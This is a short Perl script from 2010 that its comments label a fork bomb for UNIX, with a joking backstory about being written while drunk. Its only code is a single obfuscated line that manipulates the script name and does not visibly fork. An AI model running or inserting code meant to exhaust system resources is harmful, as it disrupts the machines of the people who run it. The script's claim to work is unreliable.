# !/usr/bin/perl 
##
# $Id: weird.pl,v 1.0 2010-11-16 17:33:15-02 nbrito $
##

##------------------x------------------x------------------x------------------##
# Author: Nelson Brito <nbrito [at] sekure [dot] org>
##
# Copyright(c) 2000-2010 Nelson Brito. All rights reserved worldwide.
##
# This file is part of Weird Perl Script [FORK BOMB].
##------------------x------------------x------------------x------------------##
# It does not work on Windows, but probably works on UNIX.
#
# This code was designed, back in 2000, while  I was drunk - right after a good
# happy-hour session with some University fellows.
#
# The day after, during a terrible hangover, I just found my brother's computer
# turned on with this piece of code  on the screen,  and  I got no clue of what
# the hell this code should do.
##------------------x------------------x------------------x------------------##
{(!($^O=~/^[M]*$32/i)&&($0=~s!^.*/!!))||($0=~s!.*\\!!)}$0;
